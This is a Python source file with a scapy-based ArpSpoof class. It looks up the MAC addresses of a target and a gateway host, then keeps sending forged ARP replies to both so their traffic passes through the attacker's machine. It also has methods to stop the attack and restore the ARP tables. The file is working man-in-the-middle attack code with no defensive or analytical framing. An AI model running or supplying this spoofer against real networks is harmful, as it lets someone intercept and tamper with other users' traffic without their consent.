import time

from scapy.all import Ether, ARP
from scapy.all import sendp, srp
from scapy.all import get_if_addr, get_if_hwaddr, conf

from model.ArpSpoofException import ArpSpoofException


class ArpSpoof:

    def __init__(self, target_ip, host_ip):
        self.__target_ip = target_ip
        self.__host_ip = host_ip

        self.__target_mac = self.discover_mac(self.__target_ip)
        self.__host_mac = self.discover_mac(self.__host_ip)

        self.__attacker_ip = get_if_addr(conf.iface)
        self.__attacker_mac = get_if_hwaddr(conf.iface)

        self.__state_spoof = True

        conf.verb = 0

    def discover_mac(self, ip):

        pkt_arp = Ether(dst="ff:ff:ff:ff:ff:ff", type="ARP") / ARP(op=1, pdst=ip)
        arp_request = srp(pkt_arp, verbose=0, timeout=10)

        if len(arp_request[0]) != 0:
            return arp_request[0][0][1].hwsrc
        else:
            return None

    def spoof(self):
        # check mac of devices
        if self.__attacker_mac is None:
            raise ArpSpoofException(msg="No se pudo obtener la MAC Local")
        elif self.__target_mac is None:
            raise ArpSpoofException(msg="No se pudo obtener la MAC target")
        elif self.__host_mac is None:
            raise ArpSpoofException(msg="No se pudo obtener la MAC host")
        else:
            while self.__state_spoof:
                # Precompile the packages to send to the targets
                pkt_arp_spoof_target = Ether(src=self.__host_mac, dst=self.__target_mac) / \
                                       ARP(op=2, hwsrc=self.__attacker_mac, psrc=self.__host_ip,
                                           hwdst=self.__target_mac, pdst=self.__target_ip)

                pkt_arp_spoof_host = Ether(src=self.__target_mac, dst=self.__host_mac) / \
                                        ARP(op=2, hwsrc=self.__attacker_mac, psrc=self.__target_ip,
                                            hwdst=self.__host_mac, pdst=self.__host_ip)

                # Precompile the packages to send to the targets
                sendp(pkt_arp_spoof_target, verbose=False)
                sendp(pkt_arp_spoof_host, verbose=False)

                time.sleep(1)

                yield self.__attacker_mac + " is at " + self.__target_ip + " " + self.__host_ip

    def stop_spoof(self):
        # Change the state of the Spoof method to False to stop the attack
        self.__state_spoof = False

    def reverse_spoof(self):
        # Reverse the attack and change the target's ARP table to its normal state

        pkt_arp_spoof_reverse_target = Ether(src=self.__host_mac, dst=self.__target_mac) / \
                                       ARP(op=2, hwsrc=self.__host_mac, psrc=self.__host_ip,
                                           hwdst=self.__target_mac, pdst=self.__target_ip)

        pkt_arp_spoof_reverse_host = Ether(src=self.__target_mac, dst=self.__host_mac) / \
                                        ARP(op=2, hwsrc=self.__target_mac, psrc=self.__target_ip,
                                            hwdst=self.__host_mac, pdst=self.__host_ip)
        for x in range(0, 5):
            sendp(pkt_arp_spoof_reverse_target, verbose=False)
            sendp(pkt_arp_spoof_reverse_host, verbose=False)
            time.sleep(0.5)

            yield self.__attacker_mac + " is at " + self.__host_mac + " " + self.__target_ip + " " + \
                  self.__target_mac + " " + self.__host_ip
